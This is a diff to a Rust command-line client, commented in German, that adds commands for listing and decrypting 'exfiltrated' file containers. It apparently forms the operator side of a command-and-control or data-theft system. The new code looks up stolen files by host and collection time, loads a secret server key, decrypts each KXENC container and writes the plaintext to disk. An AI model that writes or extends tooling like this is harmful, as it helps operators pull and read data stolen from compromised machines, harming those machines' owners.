@@ -71,6 +71,23 @@ enum Command {
         #[arg(long)]
         command: String,
     },
+    /// Alle exfiltrierten Datei-Container auflisten (Issue #31).
+    Files,
+    /// Einen KXENC-Container entschluesseln und als Datei ablegen.
+    ///
+    /// Der Klartext entsteht auf dem Rechner des Operators, nicht auf dem
+    /// Server — wie bei `secrets --decrypt`.
+    FileOpen {
+        /// Datei-Kennung (siehe `kx-cli files`).
+        #[arg(long)]
+        file_id: String,
+        /// Zielpfad fuer den Klartext.
+        #[arg(long)]
+        out: PathBuf,
+        /// Pfad zum geheimen Server-Schluessel (JSON).
+        #[arg(long)]
+        server_key: PathBuf,
+    },
 }
 
 #[tokio::main]
@@ -199,6 +216,69 @@ async fn main() {
                     std::process::exit(1);
                 }
             }
+        }
+        Command::Files => match c.files().await {
+            Ok(files) => {
+                info!("{} Dateien gefunden", files.len());
+                for f in &files {
+                    println!(
+                        "{:<34} {:<20} {:<30} {:>12} {:<25} {}",
+                        f.file_id, f.host_id, f.filename, f.plain_size, f.collected_at, f.id
+                    );
+                }
+            }
+            Err(e) => {
+                error!("Datei-Abfrage fehlgeschlagen: {e}");
+                std::process::exit(1);
+            }
+        },
+        Command::FileOpen {
+            file_id,
+            out,
+            server_key,
+        } => {
+            let files = match c.files().await {
+                Ok(f) => f,
+                Err(e) => {
+                    error!("Datei-Abfrage fehlgeschlagen: {e}");
+                    std::process::exit(1);
+                }
+            };
+            let Some(file) = files.iter().find(|f| &f.file_id == file_id) else {
+                error!("Keine Datei mit Kennung {file_id} — siehe `kx-cli files`");
+                std::process::exit(1);
+            };
+            let entschluesseler = match decrypt::Decryptor::load(server_key) {
+                Ok(d) => d,
+                Err(e) => {
+                    error!("Server-Schluessel unbrauchbar: {e}");
+                    std::process::exit(1);
+                }
+            };
+            let hosts = match c.hosts().await {
+                Ok(h) => h,
+                Err(e) => {
+                    error!("Host-Abfrage fehlgeschlagen: {e}");
+                    std::process::exit(1);
+                }
+            };
+            let klartext = match entschluesseler.decrypt_file(file, &hosts) {
+                Ok(k) => k,
+                Err(e) => {
+                    error!("Entschluesselung fehlgeschlagen: {e}");
+                    std::process::exit(1);
+                }
+            };
+            if let Err(e) = std::fs::write(out, &klartext) {
+                error!("Klartext nicht schreibbar ({}): {e}", out.display());
+                std::process::exit(1);
+            }
+            info!(
+                "{} ({} Byte) entschluesselt nach {}",
+                file.filename,
+                klartext.len(),
+                out.display()
+            );
         }
     }
 }
